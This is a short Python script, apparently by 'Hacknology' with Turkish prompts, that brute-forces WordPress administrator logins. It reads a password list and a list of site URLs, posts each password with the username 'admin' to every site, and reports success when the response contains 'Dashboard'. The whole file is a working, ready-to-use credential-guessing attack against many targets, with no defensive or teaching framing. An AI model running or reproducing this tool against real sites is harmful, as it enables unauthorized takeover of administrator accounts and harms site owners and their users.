import requests
import sys
__author__ = "Hacknology"
sifre_txt = input('[*]Sifrelerin dosyasını sonunda .txt olacak sekilde girin')
url_txt = input('[*]Url dosyasını sonunda .txt olacak sekilde girin:')
sifreler = open(sifre_txt, "r").readlines()
urller = open(url_txt, "r").readlines()
for site in urller:
    site = site.strip()
    for sifre in sifreler:            
        session = requests.Session()
        print(site, "-->", sifre)
        try:
        
            r = session.post(site, data={"log":"admin","pwd":sifre},timeout=5)
            
        except (requests.exceptions.ConnectionError):
            
            continue
            
        if "Dashboard" in r.text:
            print("[+]", site , "urlsi icin", sifre, "sifresi dogru!")
            sys.exit()
